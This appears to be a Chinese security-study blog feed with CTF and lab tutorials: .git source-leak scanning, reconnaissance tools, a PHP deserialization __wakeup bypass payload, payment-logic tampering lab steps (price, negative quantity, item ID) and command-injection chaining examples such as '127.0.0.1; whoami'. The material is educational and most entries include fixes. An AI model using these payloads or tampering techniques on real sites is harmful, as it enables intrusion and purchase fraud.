<h1 id="GitHack-py3（-git源码泄露）"><a href="#GitHack-py3（-git源码泄露）" class="headerlink" title="GitHack-py3（.git源码泄露）"></a>GitHack-py3（.git源码泄露）</h1><p>在终端输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python GitHack.py http:‘域名’/.git</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20230611104852-5m5arjf.png" alt="image.png"></p>
<p>会在相对路径下生成一个目标文件。</p>
<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><h2 id="fofa搜索："><a href="#fofa搜索：" class="headerlink" title="fofa搜索："></a>fofa搜索：</h2><p>fofa是一个强大的搜索工具，可对大量网站的资产进行快速搜集。</p>
<p>网站：</p>
<p><a href="https://fofa.info/">https://fofa.info/</a></p>
<table>
<thead>
<tr>
<th>语 法</th>
<th>描 述</th>
</tr>
</thead>
<tbody><tr>
<td>host&#x3D;”.gov.cn”</td>
<td>从URL中搜索带有.gov.cn的网站</td>
</tr>
<tr>
<td>ip&#x3D;”1.1.1.1”</td>
<td>从IP中搜索包含1.1.1.1的网站</td>
</tr>
<tr>
<td>domain&#x3D;”qq.com”</td>
<td>搜索根域名带有qq.com的网站</td>
</tr>
<tr>
<td>country&#x3D;”CN”</td>
<td>搜索指定国家（中国）的网站</td>
</tr>
<tr>
<td>header&#x3D;”adc”</td>
<td>从HTTP头中搜索包含abc的网站</td>
</tr>
</tbody></table>
<h2 id="域名搜集"><a href="#域名搜集" class="headerlink" title="域名搜集"></a>域名搜集</h2><p><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p>
<p><img src="/assets/image-20230611112624-i9k57b9.png" alt="image.png"></p>
<h2 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h2><p><a href="https://icp.aizhan.com/">https://icp.aizhan.com/</a></p>
<p><img src="/assets/image-20230611112650-q1aqqnz.png" alt="image.png"></p>
<h2 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h2><p><img src="/assets/image-20230611112726-2y7yshg.png" alt="image.png"></p>
<h2 id="查找真实ip-17ce-com"><a href="#查找真实ip-17ce-com" class="headerlink" title="查找真实ip:17ce.com"></a>查找真实ip:17ce.com</h2><p><img src="/assets/image-20230611112742-4imyu2m.png" alt="image.png"></p>
<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p>python3 dirsearch.py -u <a href="http://192.168.0.200:28051/">http://192.168.0.200:28051</a> -e php</p>
<p>-e表示扫描文件的扩展名为php</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/assets/</url>
    <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="源代码泄露"><a href="#源代码泄露" class="headerlink" title="源代码泄露"></a>源代码泄露</h1><h1 id="源代码泄露-1"><a href="#源代码泄露-1" class="headerlink" title="源代码泄露"></a>源代码泄露</h1><p>对网站的渗透过程中，由于网站管理人员的疏忽或网站配置不当会使一些本应该隐藏的目录及文件暴露到公网上，如网站备份、带有账号密码的网站说明等，还有些网站的后台路径名非常容易被攻击者猜解到，这些都对网站的安全性造成极大的威胁。</p>
<h1 id="1-文件搜集"><a href="#1-文件搜集" class="headerlink" title="1.文件搜集"></a>1.文件搜集</h1><p>搜索网站</p>
<h1 id="2-网站的探测工具"><a href="#2-网站的探测工具" class="headerlink" title="2.网站的探测工具"></a>2.网站的探测工具</h1><p>御剑</p>
<p>code_search</p>
<p>GitHack-py3</p>
<h1 id="3-源码泄露"><a href="#3-源码泄露" class="headerlink" title="3.源码泄露"></a>3.源码泄露</h1><h2 id="1-版本管理文件"><a href="#1-版本管理文件" class="headerlink" title="1)版本管理文件"></a>1)版本管理文件</h2><p>&#x2F;robots.txt</p>
<p>&#x2F;.git</p>
<p>&#x2F;.svn</p>
<h2 id="2-备份文件"><a href="#2-备份文件" class="headerlink" title="2)备份文件"></a>2)备份文件</h2><p>&#x2F;.index.php.swp.</p>
<p>&#x2F;.index.php.bak.</p>
<p><img src="/assets/image-20230611105055-36dug1w.png" alt="image.png"></p>
<p><img src="/assets/image-20230611105535-sxr6i7u.png" alt="image.png"></p>
<p><img src="/assets/image-20230611105727-tgjih1i.png" alt="image.png"></p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1-BUUCTF-常见的搜集"><a href="#1-BUUCTF-常见的搜集" class="headerlink" title="1.BUUCTF_常见的搜集"></a>1.BUUCTF_常见的搜集</h2><p><img src="/assets/image-20230611111540-q69m7j8.png" alt="image.png"></p>
<p><img src="/assets/image-20230611111553-j9iea1d.png" alt="image.png"></p>
<h3 id="1-查看网页源码"><a href="#1-查看网页源码" class="headerlink" title="1.查看网页源码"></a>1.查看网页源码</h3><p><img src="/assets/image-20230611111653-9erfz0t.png" alt="image.png"></p>
<p>没有发现有用信息。</p>
<h3 id="2-扫描工具扫描"><a href="#2-扫描工具扫描" class="headerlink" title="2.扫描工具扫描"></a>2.扫描工具扫描</h3><p><img src="/assets/image-20230611113032-tn1i8ib.png" alt="image.png"></p>
<p><img src="/assets/image-20230611113146-v9svh2k.png" alt="image.png"></p>
<p>扫描结束。</p>
<p>我们可以根据扫描结果，去访问扫描出来的可疑网站。</p>
<p><img src="/assets/image-20230611113257-sprb64p.png" alt="image.png"></p>
<p>成功找出第二段flag。</p>
<p><img src="/assets/image-20230611113339-qziqq8z.png" alt="image.png"></p>
<p><img src="/assets/image-20230611113403-q9qg42a.png" alt="image.png"></p>
<p>访问网站，下载文件后，用notpad++打开该文件，ctrl+f搜索flag，成功得到第三段flag。</p>
<p><img src="/assets/image-20230611113518-hm7w176.png" alt="image.png"></p>
<p>访问robots.txt后，出现txt文件提示，继续访问。</p>
<p><img src="/assets/image-20230611113610-tkw2csp.png" alt="image.png"></p>
<p>成功得到第一段flag。</p>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>最后，将三段flag拼接起来，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n1book&#123;info_1s_v3ry_imp0rtant_hack&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-BUUCTF-粗心的小李"><a href="#2-BUUCTF-粗心的小李" class="headerlink" title="2.BUUCTF_粗心的小李"></a>2.BUUCTF_粗心的小李</h2><p><img src="/assets/image-20230611113952-jvray1l.png" alt="image.png"></p>
<p><img src="/assets/image-20230611114002-vvmggiw.png" alt="image.png"></p>
<h3 id="1-查看源代码"><a href="#1-查看源代码" class="headerlink" title="1.查看源代码"></a>1.查看源代码</h3><p><img src="/assets/image-20230611114027-y996k4s.png" alt="image.png"></p>
<p>没有发现异常。</p>
<h3 id="2-扫描网站"><a href="#2-扫描网站" class="headerlink" title="2.扫描网站"></a>2.扫描网站</h3><p>由于题目中给出提示为.git源码泄露。</p>
<p>使用GitHack-py3工具进行扫描。</p>
<p>python .\GitHack.py <a href="http://6dc35db1-afb5-4e24-ae79-9c70270c1379.node4.buuoj.cn:81/.git">http://6dc35db1-afb5-4e24-ae79-9c70270c1379.node4.buuoj.cn/.git</a></p>
<p><img src="/assets/image-20230611114237-5t9zhch.png" alt="image.png"></p>
<p>文件下载成功。</p>
<p><img src="/assets/image-20230611114257-epd6ji4.png" alt="image.png"></p>
<p><img src="/assets/image-20230611114320-hnijwz2.png" alt="image.png"></p>
<p>打开文件，成功得到flag。</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/XSS/XSS%E8%A0%95%E8%99%AB/</url>
    <content><![CDATA[<h1 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h1><p>​<img src="/assets/image-20231008085345-irh2721.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008085414-6fpgnf1.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008085437-2acgt00.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008085552-9bx8evk.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008085640-i3fi7xw.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008090817-ye33kwg.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008090904-r4pl1p1.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008091008-0k323st.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008091258-1mxj1ij.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008091319-fyezc19.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008091350-4prenme.png" alt="image">​</p>
<p>‍</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WP/Untitled/</url>
    <content><![CDATA[<h1 id="Untitled"><a href="#Untitled" class="headerlink" title="Untitled"></a>Untitled</h1><p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/XSS/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><p>​<img src="/assets/image-20231020192854-4pzhwnw.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020193001-ye60n9h.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020193018-8u0qeta.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020193048-39xnvu1.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020193115-n83ww65.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020193132-x4pr73u.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020193213-wxabrrt.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020194858-7iw2vl1.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020194941-q7y1gq1.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020194951-jb70ln2.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020195017-geotvoy.png" alt="image">​</p>
<p>​<img src="/assets/image-20231020195704-nltcvjy.png" alt="image">​</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/XSS/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%92%8C%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="伪协议和编码绕过"><a href="#伪协议和编码绕过" class="headerlink" title="伪协议和编码绕过"></a>伪协议和编码绕过</h1><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>​<img src="/assets/image-20231008083228-u3fgst3.png" alt="image">​</p>
<p>‍</p>
<p>​<img src="/assets/image-20231008083303-mi07ngv.png" alt="image"></p>
<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>​<img src="/assets/image-20231008083619-duc45mc.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008083713-fgy5s33.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008083847-uls40ai.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008084130-nl45nvw.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008084152-cmv9e89.png" alt="image">​</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/XSS/%E6%B7%B7%E6%B7%86%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<h1 id="混淆编码"><a href="#混淆编码" class="headerlink" title="混淆编码"></a>混淆编码</h1><h2 id="1-混合编码"><a href="#1-混合编码" class="headerlink" title="1.混合编码"></a>1.混合编码</h2><p>​<img src="/assets/image-20231008091848-uz85y9c.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008091931-1ii28ht.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008091953-f7cten6.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008092154-3pp8rxs.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008092222-30rir5c.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008092317-ep1n9v3.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008092326-pqmv2dg.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008092334-vhisaeg.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008092349-kiwb72q.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008092428-ioroet7.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008092631-vjsv2sn.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008093003-qimd6pr.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008093138-tk0w4zs.png" alt="image">​</p>
<p>​<img src="/assets/image-20231008093246-z87imuc.png" alt="image">​</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h1><p>‍</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP__toString%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="PHP-toString反序列化利用"><a href="#PHP-toString反序列化利用" class="headerlink" title="PHP__toString反序列化利用"></a>PHP__toString反序列化利用</h1><p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%BB%95%E8%BF%87__wakeup()/</url>
    <content><![CDATA[<h1 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">O:4:<span class="string">&quot;Name&quot;</span>:2:&#123;s:14:<span class="string">&quot;Nameusername&quot;</span>;s:5:<span class="string">&quot;admin&quot;</span>;s:14:<span class="string">&quot;Namepassword&quot;</span>;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>这个序列化字符串看起来是PHP的序列化格式。PHP中的<code>serialize()</code>​函数可以将数据结构转换为字符串，以便在存储或传输时使用，然后可以使用<code>unserialize()</code>​函数将其还原为原始数据结构。这个字符串表示一个包含两个属性的对象。</p>
<p>解析这个字符串：</p>
<ol>
<li>​<code>O:4:&quot;Name&quot;:2:&#123;...&#125;</code>​：这部分表示一个对象（Object），其类名为 “Name”，包含两个属性。</li>
<li>​<code>s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;</code>​：这部分表示对象的第一个属性。属性名为 “Nameusername”，其值是 “admin”。其中，<code>s</code>​ 表示字符串，<code>14</code>​ 表示字符串的长度，然后后面跟着实际的字符串值 “admin”。</li>
<li>​<code>s:14:&quot;Namepassword&quot;;i:100;</code>​：这部分表示对象的第二个属性。属性名为 “Namepassword”，其值是整数 100。<code>i</code>​ 表示整数，后面跟着整数值 100。</li>
</ol>
<p>所以，这个序列化字符串表示一个名为 “Name” 的对象，它有两个属性 “Nameusername” 和 “Namepassword”，分别对应字符串 “admin” 和整数 100。</p>
<p>‍</p>
<p>在反序列化的时候会首先执行<code>__wakeup()</code>​魔术方法，但是这个方法会把我们的username重新赋值，所以我们要考虑的就是怎么跳过<code>__wakeup()</code>​，而去执行<code>__destruct</code>​。</p>
<p>在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()，去执行__destruct</p>
<p>于是我们这样构造pyload:</p>
<p>?select&#x3D;O:4:&quot;Name&quot;:3:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/private%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h1 id="private变量"><a href="#private变量" class="headerlink" title="private变量"></a>private变量</h1><p>这个变量是private。</p>
<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字。</p>
<p>段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。</p>
<p>于是我们在构造一回pyload:</p>
<p>?select&#x3D;O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
<p>​<img src="/assets/image-20231023100858-dd0i0w7.png" alt="image">​</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="支付逻辑漏洞"><a href="#支付逻辑漏洞" class="headerlink" title="支付逻辑漏洞"></a>支付逻辑漏洞</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>随着网民越来越习惯于网上购物，出现了越来越多的电商网站，在线交易平台等。其中肯定要涉及在线支付的流程，而这里面也有很多购物支付的逻辑。由于这里涉及到金钱，如果网站逻辑设计不当，很有可能造成低价或者0元购买商品等很严重的漏洞。</p>
<p>支付逻辑漏洞分类:</p>
<h1 id="1支付过程中可直接修改数据包中的支付金额"><a href="#1支付过程中可直接修改数据包中的支付金额" class="headerlink" title="1支付过程中可直接修改数据包中的支付金额"></a>1支付过程中可直接修改数据包中的支付金额</h1><p> 这种漏洞应该是支付漏洞中最常见的，主要针对支付宝等需要第三方支付的案例。开发人员往往会为了方便，直接在支付的关键步骤数据包中直接传递需要支付的金额。而这种金额后端没有做校验，传递过程中也没有做签名，导致可以随意篡改金额提交。</p>
<p>只需要在支付过程中用抓包工具抓包发现有金额的参数修改成任意即可。</p>
<h1 id="2没有对购买数量进行限制"><a href="#2没有对购买数量进行限制" class="headerlink" title="2没有对购买数量进行限制"></a>2没有对购买数量进行限制</h1><p>这种案例也比较常见，产生的原因是开发人员没有对购买商品的数量参数进行严格的限制。这种同样是数量的参数没有做签名，在抓包后导致可随意修改数量，经典的修改方式就是改成负数。</p>
<p>当购买的数量是一个负数时，总额的算法仍然是”购买数量x单价&#x3D;总价”。所以这样就会导致有一个负数的需支付金额。若支付成功，则可能导致购买到了一个负数数量的产品，也有可能购物网站会返还相应的积分&#x2F;金币到你的账户上。</p>
<p>但是，这种情况不可能发生在通过支付宝支付的订单中，因为显然支付宝是不支持一个负数金额的订单，所以这种情况多数发生在一个有站内虚拟货币的网站。</p>
<h1 id="3购买商品编号篡改"><a href="#3购买商品编号篡改" class="headerlink" title="3购买商品编号篡改"></a>3购买商品编号篡改</h1><p>例如商品积分兑换处，100个积分只能换商品编号为001的低价格商品，1000个积分能换商品编号005的高价格商品，在用100积分换商品的时候抓包把换商品的编号从001修改为005，用低积分换区高积分商品。</p>
<h1 id="4支付逻辑顺序执行缺陷"><a href="#4支付逻辑顺序执行缺陷" class="headerlink" title="4支付逻辑顺序执行缺陷"></a>4支付逻辑顺序执行缺陷</h1><p>部分网站的支付逻辑可能是先A过程后B过程然后C过程最后D过程用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。但是，如果用户直接从B直接进入了D过程，就绕过了C过程。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。</p>
<h1 id="5请求重放"><a href="#5请求重放" class="headerlink" title="5请求重放"></a>5请求重放</h1><p>购买商品成功后，重放购买成功的http请求，可以使购买的商品一直增加。购买成功后，会有一个从银行向商户网站跳转的过程，如果这个过程反复的重放，有可能导致商品的反复购买和增加，但是用户不需要支付更多的金钱。</p>
<h1 id="6程序的异常处理"><a href="#6程序的异常处理" class="headerlink" title="6程序的异常处理"></a>6程序的异常处理</h1><p>程序的异常处理比较少见，不过也是有案例的。程序的异常处理，就是指支付的数据包异常的程序的错误处理。这种异常可以是数据与KEY不符，支付的金额有错误，购买的数量不正确等等。程序的异常处理出现的原因主要是开发人员对出现异常后的处理不当造成的。</p>
<p>支付逻辑漏洞案例：</p>
<p>1、乌云案例之顺丰宝业务逻辑漏洞、乐视商城逻辑支付漏洞、读览天下支付逻辑漏洞、天翼云盘通支付逻辑漏洞、药房网订单提交逻辑漏洞、淘美网绕过支付：<a href="https://www.cnblogs.com/nongchaoer/p/12201419.html">https://www.cnblogs.com/nongchaoer/p/12201419.html</a></p>
<p>2、三个实例告诉你：在线支付逻辑缺陷引发的安全问题</p>
<p>3、12308订单支付时的总价未验证漏洞(支付逻辑漏洞)</p>
<p>当然支付逻辑漏洞不止上面列举的这些类型，但最常见的支付漏洞为直接修改金额，修改购买商品数量以及窜改商品编号这三种，下面就来实践下这三种支付逻辑漏洞。</p>
<p>实验目的<br>  通过该实验了解支付逻辑漏洞，掌握常见的支付漏洞原理以及漏洞检测利用和漏洞防护。</p>
<p>实验环境</p>
<p>Win7</p>
<p>IP地址:10.1.1.23</p>
<p>工具路径：C：&#x2F;tools</p>
<p>实验步骤一<br>支付过程中可直接修改数据包中的支付金额</p>
<p>访问<a href="http://10.1.1.23/demo/">http://10.1.1.23/demo/</a></p>
<p>用账号tom密码123456 登录进入系统</p>
<p>进入系统后，发现当前余额只有5元，尝试购买1本书籍1和1本书籍2，发现购买不成功，余额不足。</p>
<p>​<img src="/assets/image-20230720134653-kfsdo0q.png" alt="image">​</p>
<p>重新登录进入系统，打开burpsuite工具，浏览器设置本地8080端口代理，购买的数量同样输入1本书籍1和1本书籍2，在点击购买的时候抓取到数据包，分析数据包可以直接看到传输的商品金额分别为10和20，尝试直接将金额都修改为0.1然后点击forward继续发包，可以看到最后成功的使用0.2元购买到2本书籍。</p>
<p>​<img src="/assets/image-20230720134714-btygzux.png" alt="image">​</p>
<p>查看购买页面网页源代码可以发现，漏洞产生的原因就是由于直接在前端定义了商品价格，并且传输到buy.php页面处理时，并没有对价格数值进行验证，总价&#x3D;单价*数量，从而可以导致用户可以进行更改商品价格，防御的方法就是在数据库中存储商品的价格并且在订单支付时对商品的价格进行验证。</p>
<p>​<img src="/assets/image-20230720134748-i1rw4z5.png" alt="image">​</p>
<p>实验步骤二<br>没有对购买商品数量进行限制的支付逻辑漏洞</p>
<p>首先打开<a href="http://10.1.1.23/destoon/%EF%BC%8C%E7%82%B9%E5%87%BB%E7%BD%91%E7%AB%99%E5%8F%B3%E4%B8%8A%E8%A7%92%E5%85%8D%E8%B4%B9%E6%B3%A8%E5%86%8C%E8%BF%9B%E8%A1%8C%E4%B8%AA%E4%BA%BA%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%EF%BC%8C%E7%84%B6%E5%90%8E%E6%B3%A8%E5%86%8C%E6%88%90%E5%8A%9F%E8%87%AA%E5%8A%A8%E7%99%BB%E9%99%86%EF%BC%8C%E7%82%B9%E5%87%BB%E7%BD%91%E7%AB%99%E5%8F%B3%E4%B8%8A%E8%A7%92%E7%AB%99%E5%86%85%E4%BF%A1%E6%9F%A5%E7%9C%8B%E6%94%B6%E4%BB%B6%E7%AE%B1%E4%B8%AD%E5%90%8D%E4%B8%BA%E5%85%85%E5%80%BC%E5%8D%A1%E7%9A%84%E4%BF%A1%E4%BB%B6%E3%80%82">http://10.1.1.23/destoon/，点击网站右上角免费注册进行个人会员注册，然后注册成功自动登陆，点击网站右上角站内信查看收件箱中名为充值卡的信件。</a></p>
<p>​<img src="/assets/image-20230720134802-vy139l5.png" alt="image">​</p>
<p>使用信件中的充值卡号和密码进行充值，点击上方的交易管理-&gt;充值记录-&gt;充值卡充值，填入对应的卡号和密码进行充值，充值成功后点击资金流水看到当前账户的余额为100元。</p>
<p>​<img src="/assets/image-20230720134810-egba3hp.png" alt="image">​</p>
<p>充值成功后，直接访问首页<a href="http://10.1.1.23/destoon/%EF%BC%8C%E7%82%B9%E5%87%BB%E5%9B%A2%E8%B4%AD%EF%BC%8C%E7%9C%8B%E5%88%B0%E6%AD%A3%E5%9C%A8%E8%BF%9B%E8%A1%8C%E4%BF%83%E9%94%80%E7%9A%84%E8%8B%B9%E6%9E%9C6%EF%BC%8C%E7%82%B9%E5%87%BB%E5%8F%82%E5%9B%A2-%3E%E8%B4%AD%E4%B9%B0%EF%BC%8C%E6%9D%A5%E5%88%B0%E8%AE%A2%E5%8D%95%E7%A1%AE%E8%AE%A4%E9%A1%B5%E9%9D%A2%EF%BC%8C%E8%B4%AD%E4%B9%B0%E4%B8%80%E4%B8%AA%E8%8B%B9%E6%9E%9C6%E6%89%8B%E6%9C%BA%E4%BB%B7%E6%A0%BC66.66%E5%85%83%EF%BC%8C%E5%A1%AB%E5%86%99%E6%94%B6%E8%B4%A7%E6%89%8B%E6%9C%BA%E5%8F%B7%E7%A0%81%E3%80%82">http://10.1.1.23/destoon/，点击团购，看到正在进行促销的苹果6，点击参团-&gt;购买，来到订单确认页面，购买一个苹果6手机价格66.66元，填写收货手机号码。</a></p>
<p>​<img src="/assets/image-20230720134825-gnn4sqc.png" alt="image">​</p>
<p>打开抓包工具Burp，并设置好相关代理，点击提交订单，观察burp抓到的数据包。如下图所示，抓到的数据包中没有看到有关金额的值，但是有个number字段等于1，可以推测这个nubmer字段的值可能就为购买的商品数量，尝试将其修改为-1并点击forward发送数据包。</p>
<p>​<img src="/assets/image-20230720134833-prwvfru.png" alt="image">​</p>
<p>发送过后可以看到网页提示订单生成成功，随后跳转到个人中心，团购订单页面发现订单已经变为已付款状态，同时查看资金流水也发现，个人账户多了66.66元，余额为166.66元。</p>
<p>​<img src="/assets/image-20230720134842-mqa6pbk.png" alt="image">​</p>
<p>这就是由于网站没对用户购买的商品数量进行检验，从而导致网站返还金钱到用户账户，查看对应的处理商品购买的页面代码位于 C:\phpStudy\WWW\destoon\module\group\buy.inc.php</p>
<p>可以发现网站只对传入进来的number值带入intval函数进行是否是整数的判断，随后就直接带入$amout&#x3D;$number*$item[‘price’]，那么如果用户传入的数量为一个负数则就会导致一个负数的支付总额，从而导致网站返还金额给用户。</p>
<p>​<img src="/assets/image-20230720134900-q8vh1wy.png" alt="image">​</p>
<p>那么防御的方法也很简单，把上图中被注释掉的代码取消注释，增加对number值进行一个是否小于1的判断，也就是判断用户购买的商品数量是否小于1。</p>
<h2 id="实验步骤三"><a href="#实验步骤三" class="headerlink" title="实验步骤三"></a>实验步骤三</h2><p>支付过程中对购买商品编号进行篡改</p>
<p>打开浏览器访问<a href="http://10.1.1.23/yershop/">http://10.1.1.23/yershop/</a> 进行注册登录</p>
<p>首先点击首页1F位置的苹果，价格为299元，观察商品详情页的url链接，链接中有id&#x2F;42的字样，推测可能为商品的id编号<a href="http://10.1.1.23/yershop/index.php?s=/Home/Article/detail/id/42.html">http://10.1.1.23/yershop/index.php?s=/Home/Article/detail/id/42.html</a></p>
<p>​<img src="/assets/image-20230720134917-oc95mbg.png" alt="image">​</p>
<p>再回到首页点击2F位置的魅族手机页面，价格为2268元，同时观察url链接中的商品id编号为68</p>
<p>​<img src="/assets/image-20230720134926-59ls5p5.png" alt="image">​</p>
<p>回到苹果商品详情页面，打开burp，设置好相关代理，点击加入购物车。在Burp界面可以看到截取的信息，同样可以发现POST的第一个参数id是商品的标示信息，这里为苹果的42，在购物车显示的商品名就是通过这个参数传递在数据库查询出来的。</p>
<p>​<img src="/assets/image-20230720134939-mjo2n3c.png" alt="image">​</p>
<p>修改此商品的id参数值为魅族手机的id号68，当继续发包时，传递的id参数，在数据库查询为魅族手机的商品名，而传递的price价格参数为苹果的价格。导致加入到购物车后显示的业务信息不一致。</p>
<p>到网站购物车查看，发现只需要苹果的价格299元就可以购买到价格2268元的魅族手机，并且最后可以成功下单。</p>
<p>​<img src="/assets/image-20230720134954-rr38p58.png" alt="image">​</p>
<p>修复方案：</p>
<p>1.对于传递重要的参数信息应当加密隐藏</p>
<p>2.传递多个参数之间应当检测数据的一致性</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h1 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h1><h1 id="windows下连接两条命令"><a href="#windows下连接两条命令" class="headerlink" title="windows下连接两条命令"></a>windows下连接两条命令</h1><p>|  直接执行后面的语句，如ping<br><a href="http://www.baidu.com|whoami">www.baidu.com|whoami</a></p>
<p>||  如果前面的语句执行出错，则执行后面的。如ping<br>2||whoami</p>
<p>&amp;  前面的语句可真可假。如ping<br>2&amp;whoami</p>
<p>&amp;&amp;  前面的语句为真时，才执行后面的语句。如ping<br><a href="http://www.baidu.com/">www.baidu.com</a> &amp;&amp; whoami</p>
<h1 id="Linux下连接两条命令"><a href="#Linux下连接两条命令" class="headerlink" title="Linux下连接两条命令"></a>Linux下连接两条命令</h1><p>|  管道符，直接执行后面的语句，如ping<br>-c 4 127.0.0.1 | whoami</p>
<p>||  如果前面的语句执行出错，则执行后面的。如ping<br>-c 4 2 || whoami</p>
<p>;  执行完前面的，直接执行后面的；如ping<br>-c 4 127.0.0.1; whoami</p>
